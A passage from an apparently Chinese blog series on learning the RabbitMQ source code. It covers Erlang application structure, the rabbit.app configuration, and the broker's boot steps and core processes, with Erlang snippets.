?EMPTY_FRAME_SIZE})\n\tend.\n```\n\nrabbit_alarm启动:\n\n```erlang\n%% rabbit_alarm进程启动的入口(RabbitMQ App应用启动的时候第一个执行的接口)\nstart_link() ->\n\tgen_event:start_link({local, ?SERVER}).\n```\n\nstart函数\n\n```erlang\n\nstart() ->\n\t%% 启动rabbit_alarm_sup监督进程以及在该监督进程下启动rabbit_alarm进程\n\tok = rabbit_sup:start_restartable_child(?MODULE),\n\t%% 启动rabbit_alarm对应于rabbit_alarm事件服务器进程的事件处理进程\n\tok = gen_event:add_handler(?SERVER, ?MODULE, []),\n\t%% 启动vm_memory_monitor_sup监督进程以及在该监督进程下启动vm_memory_monitor进程(虚拟机内存监控进程)\n\t{ok, MemoryWatermark} = application:get_env(vm_memory_high_watermark),\n\trabbit_sup:start_restartable_child(\n\t  vm_memory_monitor, [MemoryWatermark,\n\t\t\t\t\t\t  fun (Alarm) ->\n\t\t\t\t\t\t\t\t   %% 对当前RabbitMQ系统进行一次垃圾回收\n\t\t\t\t\t\t\t\t   background_gc:run(),\n\t\t\t\t\t\t\t\t   %% 设置报警器的函数\n\t\t\t\t\t\t\t\t   set_alarm(Alarm)\n\t\t\t\t\t\t  end,\n\t\t\t\t\t\t  %% 清除报警器的函数\n\t\t\t\t\t\t  fun clear_alarm/1]),\n\t%% 启动rabbit_disk_monitor_sup监督进程以及在该监督进程下启动rabbit_disk_monitor进程(硬盘使用监控进程)\n\t{ok, DiskLimit} = application:get_env(disk_free_limit),\n\trabbit_sup:start_delayed_restartable_child(\n\t  rabbit_disk_monitor, [DiskLimit]),\n\tok.\n```\n\ndatabase启动：\n\n```erlang\n%%----------------------------------------------------------------------------\n%% Main interface(接口)\n%%----------------------------------------------------------------------------\n%% RabbitMQ系统mnesia database启动步骤中执行的函数\ninit() ->\n\t%% 确保mnesia数据库的启动\n\tensure_mnesia_running(),\n\t%% 确保mnesia数据库保存目录的存在\n\tensure_mnesia_dir(),\n\t%% 判断当前节点是否是新启动的节点\n\tcase is_virgin_node() of\n\t\ttrue  -> init_from_config();\n\t\tfalse -> NodeType = node_type(),\n\t\t\t\t init_db_and_upgrade(cluster_nodes(all), NodeType,\n\t\t\t\t\t\t\t\t\t NodeType =:= ram)\n\tend,\n\t%% We intuitively(直观地) expect the global name server to be synced when\n\t%% Mnesia is up. In fact that's not guaranteed(保证) to be the case -\n\t%% let's make it so.\n\tok = rabbit_node_monitor:global_sync(),\n\tok.\n```\n\nTO be continue ...\n\n\n\n### 参考资料\n\nhttps://wudaijun.com/2015/04/erlang-mnesia/\n\nhttps://www.cnblogs.com/hzy1987/p/5441807.html\n\nhttps://blog.csdn.net/zhangzhizhen1988/article/details/7932449\n\nhttp://ninenines.eu/docs/en/cowboy/HEAD/guide/getting_started/\n\nhttps://github.com/ninenines/cowboy\n","tags":["rabbitmq"],"categories":["rabbitmq"]},{"title":"rabbitmq源码学习一","url":"/2020/11/17/rabbitmq源码学习/","content":"\n\n\n## rabbitmq源码学习一\n\n### erlang介绍\n\nErlang是具有多重范型的编程语言，具有很多特点，主要的特点有以下几个：\n\n- 函数式\n- 并发性\n- 分布式\n- 健壮性\n- 软实时\n- 热更新\n- 递增式代码加载\n- 动态类型\n- 解释型\n\nErlang是函数式编程语言，函数式是一种编程模型，将计算机中的运算看做是数学中的函数计算，可以避免状态以及变量的概念。\n\n对象是面向对象的第一型，函数式编程语言也是一样，函数是函数式编程的第一型。函数是Erlang编程语言的基本单位，在Erlang里，函数是第一型，函数几乎会被用作一切，包括最简单的计算。所有的概念都是由函数表达，所有额操作也都是由函数操作。\n\n### Application\n\nerlang application构成：\n\n一个应用需要一个.app文件来描述，主要描述它包括哪些文件，参数等。 \n\n通过application，可以把一个功能模块打包成一个应用，让该模块可以单独start或者stop并且可以在其他模块中引\n\n用。像mnesia那样。实现步骤：\n\n1.首先完成要打包的功能模块，并且记得定义为application  ---> 文件头加上 -behaviour(application).\n\n2.为此模块添加.app应用资源文件，格式如下：\n\n```r\n{application, Application, [Opt1,...,OptN]}.\n```\n\n注意：Application 是一个代表应用的名称的原子。文件必须被命名成 Application.app 。\n 每一个Otp 都是一个定义了应用某种特性的元组 {Key, Value} 。所有的键都是可选。忽略的键会使用默认的值。\n\n\n\n这些属性就是为了让erlang编译器知道该以哪种方式去启动此应用。\n\nch_app.app文件如下：\n\n```less\n{application, ch_app,\n[{description, \"Channel allocator\"},\n{vsn, \"1\"},\n{modules, [ch_app, ch_sup, ch3]},\n{registered, [ch3]},\n{applications, [kernel, stdlib, sasl]},\n{mod, {ch_app,[]}}\n]}.\n```\n\ndescription\n简短描述，字符串。默认为“”。\nvsn\n版本号，字符串。默认为”“。\nmodules\n由该应用引入的所有模块。当生成启动脚本和tar文件时， systools 将用到这个列表。一个模块必须被定义于且仅于一个应用。默认为[]\nregistered\n 应用中所有注册进程的名称。systools 使用这个列表来探测在应用之间是否有名称冲突。默认为 []。\n applications\n 所有在此应用之前必须启动的应用。systools 使用该列表来生成正确的启动脚本。默认为 []，但是注意任何应用\n 都要至少依赖于kernel 和 stdlib \n\n优势：\n\n当我们把一个项目中所有的supervision tree通过一个简单的函数game: start(),会发现这个树结构特别复杂，只能有一个根节点，然后一直扩展。![QQ五笔截图未命名](/images/310024519479008.png)\n\n那么有时，我们会需要：有些功能模块不启动，有些启动，如果再去改这颗树的结构，就会很麻烦。这里，这就是application出现的原因，设计一个可以随时开关的子块（application).比如：上图中的log app, db app ,game app, connect app ..\n\n\n\n### 总体机制\n\nrabbitmq启动通过beam.smp来启动，正在的代码程序控制在plugins目录中，通过erlang来启动ez包程序。主进程程序在rabbit.ez文件中。可以通过解压文件查看内部的代码逻辑。\n\n解压之后：\n\n![image-20201116173407379](/images/image-20201116173407379.png)\n\nrabbitmq使用erlang的application的结构，通过rabbit.app文件中的结构信息来启动服务。\n\n```shell\n{application, 'rabbit', [\n\t{description, \"RabbitMQ\"},\n\t{vsn, \"3.8.9\"},\n\t{id, \"v3.8.8-2-g5cf3d07\"},\n\t{modules, ['amqqueue','amqqueue_v1','background_gc','code_server_cache','gatherer','gm','lager_exchange_backend','lqueue','mirrored_supervisor_sups','pg_local','rabbit','rabbit_access_control','rabbit_alarm','rabbit_amqqueue','rabbit_amqqueue_process','rabbit_amqqueue_sup','rabbit_amqqueue_sup_sup','rabbit_auth_backend_internal','rabbit_auth_mechanism_amqplain','rabbit_auth_mechanism_cr_demo','rabbit_auth_mechanism_plain','rabbit_autoheal','rabbit_backing_queue','rabbit_basic','rabbit_binding','rabbit_boot_steps','rabbit_channel','rabbit_channel_interceptor','rabbit_channel_sup','rabbit_channel_sup_sup','rabbit_client_sup','rabbit_config','rabbit_connection_helper_sup','rabbit_connection_sup','rabbit_connection_tracking','rabbit_connection_tracking_handler','rabbit_control_pbe','rabbit_core_ff','rabbit_core_metrics_gc','rabbit_credential_validation','rabbit_credential_validator','rabbit_credential_validator_accept_everything','rabbit_credential_validator_min_password_length','rabbit_credential_validator_password_regexp','rabbit_dead_letter','rabbit_definitions','rabbit_diagnostics','rabbit_direct','rabbit_disk_monitor','rabbit_epmd_monitor','rabbit_event_consumer','rabbit_exchange','rabbit_exchange_decorator','rabbit_exchange_parameters','rabbit_exchange_type_direct','rabbit_exchange_type_fanout','rabbit_exchange_type_headers','rabbit_exchange_type_invalid','rabbit_exchange_type_topic','rabbit_feature_flags','rabbit_ff_extra','rabbit_ff_registry','rabbit_fhc_helpers','rabbit_fifo','rabbit_fifo_client','rabbit_fifo_index','rabbit_file','rabbit_framing','rabbit_guid','rabbit_health_check','rabbit_lager','rabbit_limiter','rabbit_log_tail','rabbit_looking_glass','rabbit_maintenance','rabbit_memory_monitor','rabbit_metrics','rabbit_mirror_queue_coordinator','rabbit_mirror_queue_master','rabbit_mirror_queue_misc','rabbit_mirror_queue_mode','rabbit_mirror_queue_mode_all','rabbit_mirror_queue_mode_exactly','rabbit_mirror_queue_mode_nodes','rabbit_mirror_queue_slave','rabbit_mirror_queue_sync','rabbit_mnesia','rabbit_mnesia_rename','rabbit_msg_file','rabbit_msg_store','rabbit_msg_store_ets_index','rabbit_msg_store_gc','rabbit_networking','rabbit_node_monitor','rabbit_nodes','rabbit_parameter_validation','rabbit_password','rabbit_password_hashing_md5','rabbit_password_hashing_sha256','rabbit_password_hashing_sha512','rabbit_peer_discovery','rabbit_peer_discovery_classic_config','rabbit_peer_discovery_dns','rabbit_plugins','rabbit_policies','rabbit_policy','rabbit_policy_merge_strategy','rabbit_prelaunch_cluster','rabbit_prelaunch_enabled_plugins_file','rabbit_prelaunch_feature_flags','rabbit_prelaunch_logging','rabbit_prequeue','rabbit_priority_queue','rabbit_queue_consumers','rabbit_queue_decorator','rabbit_queue_index','rabbit_queue_location_client_local','rabbit_queue_location_min_masters','rabbit_queue_location_random','rabbit_queue_location_validator','rabbit_queue_master_location_misc','rabbit_queue_master_locator','rabbit_quorum_memory_manager','rabbit_quorum_queue','rabbit_reader','rabbit_recovery_terms','rabbit_restartable_sup','rabbit_router','rabbit_runtime_parameters','rabbit_ssl','rabbit_sup','rabbit_sysmon_handler','rabbit_sysmon_minder','rabbit_table','rabbit_trace','rabbit_upgrade','rabbit_upgrade_functions','rabbit_upgrade_preparation','rabbit_variable_queue','rabbit_version','rabbit_vhost','rabbit_vhost_limit','rabbit_vhost_msg_store','rabbit_vhost_process','rabbit_vhost_sup','rabbit_vhost_sup_sup','rabbit_vhost_sup_wrapper','rabbit_vm','supervised_lifecycle','tcp_listener','tcp_listener_sup','term_to_binary_compat','unconfirmed_messages','vhost','vhost_v1']},\n\t{registered, [rabbit_sup,rabbit_amqqueue_sup,rabbit_direct_client_sup,rabbit_log,rabbit_node_monitor,rabbit_router]},\n\t{applications, [kernel,stdlib,sasl,rabbitmq_prelaunch,os_mon,inets,compiler,public_key,crypto,ssl,syntax_tools,xmerl,cuttlefish,ranch,lager,rabbit_common,ra,sysmon_handler,stdout_formatter,recon,observer_cli]},\n\t{mod, {rabbit, []}},\n\t{env, [\n\t    {tcp_listeners, [5672]},\n\t    {num_tcp_acceptors, 10},\n\t    {ssl_listeners, []},\n\t    {num_ssl_acceptors, 10},\n\t    {ssl_options, []},\n\t    {vm_memory_high_watermark, 0.4},\n\t    {vm_memory_high_watermark_paging_ratio, 0.5},\n\t    {vm_memory_calculation_strategy, rss},\n\t    {memory_monitor_interval, 2500},\n\t    {disk_free_limit, 50000000}, %% 50MB\n\t    {msg_store_index_module, rabbit_msg_store_ets_index},\n\t    {backing_queue_module, rabbit_variable_queue},\n\t    %% 0 (\"no limit\") would make a better default, but that\n\t    %% breaks the QPid Java client\n\t    {frame_max, 131072},\n\t    %% see rabbitmq-server#1593\n\t    {channel_max, 2047},\n\t    {connection_max, infinity},\n\t    {heartbeat, 60},\n\t    {msg_store_file_size_limit, 16777216},\n\t    {msg_store_shutdown_timeout, 600000},\n\t    {fhc_write_buffering, true},\n\t    {fhc_read_buffering, false},\n\t    {queue_index_max_journal_entries, 32768},\n\t    {queue_index_embed_msgs_below, 4096},\n\t    {default_user, <<\"guest\">>},\n\t    {default_pass, <<\"guest\">>},\n\t    {default_user_tags, [administrator]},\n\t    {default_vhost, <<\"/\">>},\n\t    {default_permissions, [<<\".*\">>, <<\".*\">>, <<\".*\">>]},\n\t    {loopback_users, [<<\"guest\">>]},\n\t    {password_hashing_module, rabbit_password_hashing_sha256},\n\t    {server_properties, []},\n\t    {collect_statistics, none},\n\t    {collect_statistics_interval, 5000},\n\t    {mnesia_table_loading_retry_timeout, 30000},\n\t    {mnesia_table_loading_retry_limit, 10},\n\t    {auth_mechanisms, ['PLAIN', 'AMQPLAIN']},\n\t    {auth_backends, [rabbit_auth_backend_internal]},\n\t    {delegate_count, 16},\n\t    {trace_vhosts, []},\n\t    {ssl_cert_login_from, distinguished_name},\n\t    {ssl_handshake_timeout, 5000},\n\t    {ssl_allow_poodle_attack, false},\n\t    {handshake_timeout, 10000},\n\t    {reverse_dns_lookups, false},\n\t    {cluster_partition_handling, ignore},\n\t    {cluster_keepalive_interval, 10000},\n\t    {autoheal_state_transition_timeout, 60000},\n\t    {tcp_listen_options, [{backlog,       128},\n\t                          {nodelay,       true},\n\t                          {linger,        {true, 0}},\n\t                          {exit_on_close, false}\n\t                         ]},\n\t    {halt_on_upgrade_failure, true},\n\t    {ssl_apps, [asn1, crypto, public_key, ssl]},\n\t    %% see rabbitmq-server#114\n\t    {mirroring_flow_control, true},\n\t    {mirroring_sync_batch_size, 4096},\n\t    %% see rabbitmq-server#227 and related tickets.\n\t    %% msg_store_credit_disc_bound only takes effect when\n\t    %% messages are persisted to the message store. If messages\n\t    %% are embedded on the queue index, then modifying this\n\t    %% setting has no effect because credit_flow is not used when\n\t    %% writing to the queue index. See the setting\n\t    %% queue_index_embed_msgs_below above.\n\t    {msg_store_credit_disc_bound, {4000, 800}},\n\t    {msg_store_io_batch_size, 4096},\n\t    %% see rabbitmq-server#143,\n\t    %% rabbitmq-server#949, rabbitmq-server#1098\n\t    {credit_flow_default_credit, {400, 200}},\n\t    {quorum_commands_soft_limit, 32},\n\t    {quorum_cluster_size, 5},\n\t    %% see rabbitmq-server#248\n\t    %% and rabbitmq-server#667\n\t    {channel_operation_timeout, 15000},\n\n\t    %% see rabbitmq-server#486\n\t    {autocluster,\n              [{peer_discovery_backend, rabbit_peer_discovery_classic_config}]\n            },\n\t    %% used by rabbit_peer_discovery_classic_config\n\t    {cluster_nodes, {[], disc}},\n\n\t    {config_entry_decoder, [{passphrase, undefined}]},\n\n\t    %% rabbitmq-server#973\n\t    {queue_explicit_gc_run_operation_threshold, 1000},\n\t    {lazy_queue_explicit_gc_run_operation_threshold, 1000},\n\t    {background_gc_enabled, false},\n\t    {background_gc_target_interval, 60000},\n\t    %% rabbitmq-server#589\n\t    {proxy_protocol, false},\n\t    {disk_monitor_failure_retries, 10},\n\t    {disk_monitor_failure_retry_interval, 120000},\n\t    %% either \"stop_node\" or \"continue\".\n\t    %% by default we choose to not terminate the entire node if one\n\t    %% vhost had to shut down, see server#1158 and server#1280\n\t    {vhost_restart_strategy, continue},\n\t    %% {global, prefetch count}\n\t    {default_consumer_prefetch, {false, 0}},\n\t\t%% interval at which the channel can perform periodic actions\n\t    {channel_tick_interval, 60000},\n\t    %% Default max message size is 128 MB\n\t    {max_message_size, 134217728},\n\t    %% Socket writer will run GC every 1 GB of outgoing data\n\t    {writer_gc_threshold, 1000000000}\n\t  ]}\n]}.\n```\n\n解析该文件，构建有向无环图，然后按照有向无环图的方式来调用函数启动服务进程。\n\n启动过程：\n\n 1.rabbit_alarm启动步骤(先执行rabbit_alarm:start()函数)\n\n​     (1).启动一个rabbit_alarm_sup的supervisor2监督进程同时在该监督进程下启动一个rabbit_alarm的gen_event进程\n\n​       rabbit_alarm进程作为整个RabbitMQ系统的报警进程，例如内存，磁盘大小的报警，报警后，如果有人向rabbit_alarm进程注册，\n\n​       则会进程回调，同时会通知集群中的额其他节点\n\n​     (2).启动一个vm_memory_monitor_sup的supervisor2监督进程同时在该进程下启动一个vm_memory_monitor进程\n\n​       RabbitMQ系统虚拟机内存监督报警进程，如果虚拟机中的内存少于配置文件配置的大小，则会立刻通知rabbit_alarm进程\n\n​       该进程就是RabbitMQ系统对内存使用情况监视的进程，如果当前内存使用量超过了配置文件中配置的大小，则会立刻向rabbit_alarm\n\n​       进程发布内存使用量过大的报警信息，则集群中的所有节点的rabbit_alarm进程则会将内存报警信息回调注册到rabbit_alarm进程的函数\n\n​     (3).启动一个rabbit_disk_monitor_sup的supervisor2监督进程同时在该监督进程下启动一个rabbit_disk_monitor进程\n\n​       RabbitMQ系统磁盘使用报警进程，如果磁盘剩余大小少于配置文件中配置的大小，则会立刻通知rabbit_alarm进程\n\n​       该进程就是RabbitMQ系统对磁盘使用情况监视的进程，如果磁盘剩余量少于配置文件中配置的大小，则会立刻向rabbit_alarm进程\n\n​       发布报警信息，则集群中的所有节点的rabbit_alarm进程都会将报警信息回调注册到rabbit_alarm进程的函数\n\n  2.file_handle_cache启动步骤\n\n​     (1).执行rabbit:start_fhc()函数启动file_handle_cache进程(该进程是RabbitMQ系统文件打开关闭操作关键进程)\n\n​       该进程是RabbitMQ系统所有操作磁盘文件相关操作的进程\n\n  3.worker_pool启动步骤(RabbitMQ系统异步执行任务的小系统)\n\n​     (1).首先启动一个worker_pool_sup的supervisor的监督进程\n\n​     (2).worker_pool_sup监督进程下再启动一个worker_pool的进程池管理进程\n\n​     (3).worker_pool_sup监督进程下再启动调度线程个数的worker_pool_worker的工作进程\n\n​       该监督树下的进程是用来异步提交函数让工作进程执行完成，worker_pool_worker为工作进程，worker_pool为所有worker_pool_worker进程的管理者，哪个\n\n​       worker_pool_worker进程空闲，哪个worker_pool_worker正在工作，worker_pool进程都有记录\n\n  4.database启动步骤(初始化RabbitMQ中的mnesia数据库，如果配置有集群数据库，自动连接到集群数据库)\n\n​     (1).执行rabbit_mnesia:init()函数\n\n​       该操作步骤是启动当前RabbitMQ节点的Mnesia数据库，同时将本节点同集群中的其他节点连接起来，并将集群中的数据同自己本地的数据进行同步，然后将\n\n​       RabbitMQ系统所有的数据库表启动起来\n\n  5.database_sync启动步骤\n\n​     (1).执行rabbit_sup:start_child(mnesia_sync)函数\n\n​       mnesia:sync_transaction操作没有保证Mnesia数据库的日志同步到磁盘上，则调用mnesia_sync:sync()函数的进程进行同步阻塞等待mnesia成功的将数据库\n\n​       操作日志写入磁盘上\n\n  6.codec_correctness_check启动步骤\n\n​     (1).执行rabbit_binary_generator:check_empty_frame_size()函数\n\n​       确保空的Frame数据格式的正确性\n\n  7.rabbit_registry启动步骤\n\n​     (1).执行rabbit_sup:start_child(rabbit_registry)函数\n\n​       RabbitMQ系统内部各种定义类型注册处理模块的进程，该进程启动了rabbit_registry名字的一个ETS表，用来存储分类，类型名字，以及处理模块的数据\n\n  8.rabbit_auth_mechanism_cr_demo启动步骤\n\n​     (1).执行rabbit_registry:register(auth_mechanism, <<\"RABBIT-CR-DEMO\">>, rabbit_auth_mechanism_cr_demo)函数\n\n​       RabbitMQ系统用户验证处理模块之一\n\n  9.rabbit_auth_mechanism_amqplain启动步骤\n\n​     (1).执行rabbit_registry:register(auth_mechanism, <<\"AMQPLAIN\">>, rabbit_auth_mechanism_amqplain)函数\n\n​       RabbitMQ系统用户验证处理模块之一\n\n  10.rabbit_auth_mechanism_plain启动步骤\n\n​     (1).执行rabbit_registry:register(auth_mechanism, <<\"PLAIN\">>, rabbit_auth_mechanism_plain)函数\n\n​       RabbitMQ系统用户验证处理模块之一\n\n  11.rabbit_mirror_queue_mode_all启动步骤(高可用队列相关)\n\n​     (1).执行rabbit_registry:register(ha_mode, <<\"all\">>, rabbit_mirror_queue_mode_all)函数\n\n  12.rabbit_event启动步骤(RabbitMQ系统事件管理器进程)\n\n​     (1).执行rabbit_sup:start_restartable_child(rabbit_event)函数,启动rabbit_event进程\n\n​       RabbitMQ系统中所有的事件都是发布到rabbit_event事件管理器中，只要有rabbit_event事件管理器的事件处理进程，则该进程就能接收到所有的事件\n\n  13.rabbit_exchange_tye_direct启动步骤\n\n​     (1).执行rabbit_registry:register(exchange, <<\"direct\">>, rabbit_exchange_type_direct)函数\n\n​       RabbitMQ系统exchange交换机direct类型向rabbit_registry进行注册\n\n  14.rabbit_exchange_type_fanout启动步骤\n\n​     (1).执行rabbit_registry:register(exchange, <<\"fanout\">>, rabbit_exchange_type_fanout)函数\n\n​       RabbitMQ系统exchange交换机fanout类型向rabbit_registry进行注册\n\n  15.rabbit_echange_type_headers启动步骤\n\n​     (1).执行rabbit_registry:register(exchange, <<\"headers\">>, rabbit_exchange_type_headers)函数\n\n​       RabbitMQ系统exchange交换机headers类型向rabbit_registry进行注册\n\n  16.rabbit_exchange_type_topic启动步骤\n\n​     (1).执行rabbit_registry:register(exchange, <<\"topic\">>, rabbit_exchange_type_topic)函数\n\n​       RabbitMQ系统exchange交换机topic类型向rabbit_registry进行注册\n\n​       %% rabbit_topic_trie_node表里存储的是节点数据(里面存储的是topic_trie_node数据结构，所有的路由信息都是从root节点出发)\n\n​       %% rabbit_topic_trie_edge表里存储的是边数据(里面存储的是topic_trie_node数据结构，边的数据结构里面存储的有路由信息的单个单词)\n\n​       %% rabbit_topic_trie_binding表里存储的是某个节点上的绑定信息(里面存储的是topic_trie_binding数据结构)\n\n​       %% 比如路由信息hello.#.nb：\n\n​       %% 1.有四个节点，第一个节点始终是root节点，然后是其他三个节点，\n\n​       %% 2.有三条边信息，每个边数据结构里面带有对应的单词hello，#，nb\n\n​       %% 3.在第四个节点上存在绑定的队列名字\n\n  17.rabbit_mirror_queue_mode_exactly启动步骤(高可用队列相关)\n\n​     (1).执行rabbit_registry:register(ha_mode, <<\"exactly\">>, rabbit_mirror_queue_mode_exactly)函数\n\n  18.rabbit_mirror_queue_mode_nodes启动步骤(高可用队列相关)\n\n​     (1).执行rabbit_registry:register(ha_mode, <<\"nodes\">>, rabbit_mirror_queue_mode_nodes)函数\n\n  19.rabbit_priority_queue启动步骤(启动RabbitMQ系统优先级队列)\n\n​     (1).执行rabbit_priority_queue:enable()函数\n\n​       该步骤是允许RabbitMQ系统的队列支持简单的优先级队列\n\n  20.rabbit_epmd_monitor启动步骤\n\n​     (1).执行rabbit_sup:start_restartable_child(rabbit_epmd_monitor)函数\n\n​       该进程主要用来监视epmd进程的存在，有可能epmd进程被无端的删除掉，则该进程发现epmd进程被kill掉后，会立刻进行对epmd进程进行重启\n\n  21.guid_generator启动步骤(生成独一无二的各种ID对应的模块)\n\n​     (1).执行rabbit_sup:start_restartable_child(rabbit_guild)函数\n\n​       RabbitMQ系统中生成唯一16为字符串ID的进程\n\n  22.rabbit_node_monitor启动步骤\n\n​     (1).执行rabbit_sup:start_restartable_child(rabbit_node_monitor)函数\n\n​       RabbitMQ系统中节点管理的进程，该进程会保留集群中的其他节点以及它们对应的GUID，同时节点的删除，增加都会根据该进程通知集群中的其他节点\n\n  23.delegate_sup启动步骤(多次的向远程节点发送消息，则此代理会将发送到同一个远程节点的多个消息操作统一成一个发送消息操作)\n\n​     (1).执行rabbit:boot_delegate()函数\n\n​       RabbitMQ系统中的代理进程监督树，这些代理进程主要用来多次对远程的某个节点进行多次访问，用了代理进程后，可以将多次访问变成一次访问操作\n\n  24.rabbit_memory_monitor启动步骤\n\n​     (1).执行rabbit_sup:start_restartable_child(rabbit_memory_monitor)函数\n\n​       rabbit_memory_monitor进程统计RabbitMQ系统中内存使用情况，它会收到当前系统中所有的消息队列统计的数字，同时将内存使用速率返回给各个消息\n\n​       队列\n\n  25.empty_db_check启动步骤(如果RabbitMQ系统是第一次启动则需要插入默认的账号，账号密码，vhost等默认信息)\n\n​     (1).执行rabbit:maybe_insert_default_data()函数\n\n​       RabbitMQ系统是第一次启动则需要插入默认的账号，账号密码，vhost等默认信息\n\n  26.rabbit_mirror_queue_misc启动步骤(高可用队列相关)\n\n​     (1).执行rabbit_registry:register(policy_validator, <<\"ha-mode\">>, rabbit_mirror_queue_misc)函数\n\n​     (2).执行rabbit_registry:register(policy_validator, <<\"ha-params\">>, rabbit_mirror_queue_misc)函数\n\n​     (3).执行rabbit_registry:register(policy_validator, <<\"ha-sync-mode\">>, rabbit_mirror_queue_misc)函数\n\n​     (4).执行rabbit_registry:register(policy_validator, <<\"ha-promote-on-shutdown\">>, rabbit_mirror_queue_misc)函数\n\n  27.rabbit_policies启动步骤\n\n​     (1).执行rabbit_policies:register()函数\n\n​       该启动步骤主要是向rabbit_registry进程注册policy_validator类型的相关数据(主要包括是消息队列的参数类型)\n\n  28.rabbit_policy启动步骤\n\n​     (1).执行rabbit_policy:register()函数\n\n​       该启动步骤主要是向rabbit_registry进程注册runtime_parameter类型的相关数据\n\n​       该模块是队列和交换机的公用配置参数模块的处理模块\n\n  29.recovery启动步骤\n\n​     (1).执行rabbit:recover()函数\n\n​       该启动步骤主要是恢复所有的持久化队列，将所有的持久化队列进程启动起来，将持久化的交换机信息恢复到非持久化的mnesia数据库表中，\n\n​       将持久化的绑定信息恢复到非持久化的绑定数据库表中\n\n  30.mirrored_queues启动步骤(高可用队列相关)\n\n​     (1).执行rabbit_mirror_queue_misc:on_node_up()函数\n\n  31.log_relay启动步骤(主要是将error_logger事件中心的事件发布到<<\"amq.rabbit.log\">>交换机对应的队列里)\n\n​     (1).执行rabbit_sup:start_child(rabbit_error_logger_lifecycle, supervised_lifecycle, [rabbit_error_logger_lifecycle, {rabbit_error_logger, start, []},\n\n​       {rabbit_error_logger, stop, []}]]}}函数\n\n​       该启动步骤会在rabbit_sup监督进程下启动名字为rabbit_error_logger_lifecylce监督进程，该rabbit_error_logger_lifecylce监督进程执行\n\n​       supervised_lifecycle:start_link函数，该监督进程的回调初始化函数会执行rabbit_error_logger:start()函数，该函数启动rabbit_error_logger进程，\n\n​       该进程会处理error_logger事件中心发布的事件，然后将事件依次发布到<<\"amq.rabbit.log\">>名字对应的交换机上(<<\"amq.rabbit.log\">>交换机会在\n\n​       rabbit_error_logger事件处理进程启动的时候创建)\n\n  32.background_gc启动步骤\n\n​     (1).执行rabbit_sup:start_restartable_child, [background_gc])函数\n\n​     (该进程启动一个定时器，定时的对RabbitMQ系统进行垃圾回收，定时器的间隔时间是不断变化的，如果垃圾回收的时间过长，则增加时间间隔，反之则减少垃圾回收的时     间间隔)\n\n  33.networking启动步骤\n\n​     (1).执行rabbit_networking:boot()函数\n\n​       根据配置文件中的端口，启动网络连接进程树，等待客户端通过Socket连接过来\n\n  34.direct_client启动步骤\n\n​     (1).执行rabbit_direct:boot()函数\n\n​       启动rabbit_direct_client_sup监督进程，该监督进程的动态启动子进程是执行{rabbit_channel_sup, start_link, []}\n\n​       所有客户端的连接进程都是启动在rabbit_direct_client_sup监督进程下\n\n  35.notify_cluster启动步骤\n\n​     (1).执行rabbit_node_monitor:notify_node_up()函数\n\n​       通知RabbitMQ集群系统当前节点启动\n\napplication：\n\nerlang启动application，mnesia是rabbitmq的数据库，用于存储队列消息等持久化信息等。\n\nerl> application:start(mnesia).\n\nmnesia:\n\n![image-20201116182515883](/images/image-20201116182515883.png)\n\nerl>application.start(os_mon).\n\nos_mon，主要是rabbitmq os_mon，系统监控进程\n\n![image-20201116182607427](/images/image-20201116182607427.png)\n\nerl>application.start(sasl).\n\nsasl，sasl的一个重要功能便是可以记录系统进程相关日志，如进程启动、结束、崩溃错误等信息\n\n![image-20201116182627954](/images/image-20201116182627954.png)\n\nerl>application.start(rabbit).\n\nrabbit，rabbitmq的主进程。\n\n![image-20201117092111273](/images/image-20201117092111273.png)\n\n![image-20201117092119399](/images/image-20201117092119399.png)\n\nrabbitmq中有很多application，可以认为每个插件就是一个erlang的application应用。\n\n![image-20201117092141979](/images/image-20201117092141979.png)\n\namqp_client是插件amqp_client的客户端的application，用于创建连接。\n\nrabbitmq_management等其他的是一些插件的application。我们暂时不做详细的分析了。\n\nrabbit application有比较多的进程，主要的来解释以下：\n\n1. background_gc_sup，MQ中的垃圾gc收集器，采用的erlang原生的垃圾收集机制，标记清理的方式来进程gc。\n2. delegrate代理进程，这些代理进程主要用来多次对远程的某个节点进行多次访问，用了代理进程后，可以将多次访问变成一次访问操作\n3. file_handle_cache比较重要的，在MQ中主要用于文件读写操作，进行持久化操作。\n4. mnesia_sync同步数据到磁盘的进程，该操作步骤是启动当前RabbitMQ节点的Mnesia数据库，同时将本节点同集群中的其他节点连接起来，并将集群中的数据同自己本地的数据进行同步，然后将RabbitMQ系统所有的数据库表启动起来。\n5. rabbitmq_alarm，对磁盘监控之后，告警的进程\n6. rabbit_disk_monitor_sup，对磁盘使用率监控进程\n7. epmd_monitor_sup，epmd监控\n8. error_logger_lifecycle，日志生命周期\n9. rabbit_event_sup,所有的事件都是发布到rabbit_event事件管理器中，只要有rabbit_event事件管理器的事件处理进程，则该进程就能接收到所有的事件\n10. rabbit_guid_sup,生成唯一16为字符串ID\n11. rabbit_memory_monitor_sup，内存监控\n12. rabbit_node_monitor_sup，节点监控\n13. rabbit_registry，内部各种定义类型注册处理模块的进程，该进程启动了rabbit_registry名字的一个ETS表，用来存储分类，类型名字，以及处理模块的数据\n14. vm_memory_monitor：vm_memory监控\n15. worker_pool_sup:进程池管理进程\n16. rabbit_direct_client_sup监督进程\n17. msg_store_persistent,msg_store_transient：一个用于持久消息的存储，一个用于内存不够时，将存储在内存中的非持久化数据转存到磁盘中。所有队列的消息的写入和删除最终都由这两个进程负责处理，而消息的读取则可能是队列本身直接打开文件进行读取，也可能是发送请求由msg_store_persisteng/msg_store_transient进程进行处理\n18. **rabbit_amqqueue_process**：rabbit队列进程，该进程一般在rabbitmq创建队列时被创建，其主要负责消息的接收/投递逻辑\n\n### 源码结构\n\n项目主要代码结构，主要代码都在src目录中；\n\n![image-20201117104124252](/images/image-20201117104124252.png)\n\n讲几个其中的重要的知识点吧。ORZ；\n\n1）镜像队列数据同步过程：\n\n![image-20201117104102628](/images/image-20201117104102628.png)\n\nGM：Guaranteed(保证) Multicast(组播)，用于msg的广播进程，在同步数据的时候比较重要。\n\n\n\n2）流控：rabbitmq在msg的分发的时候对消息的传播速率都做了一定的控制，这样能够保证系统和MQ的稳定性。同时可以提高性能和吞吐。\n\ncredit flow机制：\n\nMQ主要是通过credit flow的机制来实现流量控制的。通过credit 描述一个元组来进行{InitialCredit，MoreCreditAfter}，对于消息的发送者，credit 开始于InitialCredit当每个消息发送的时候进行递减。消息的接收者可以授权更多的credit给发送者，当正在接受到MoreCreditAfter消息，通过给发送着一个{bump_credit，...}控制消息。发送者应该通过这个消息 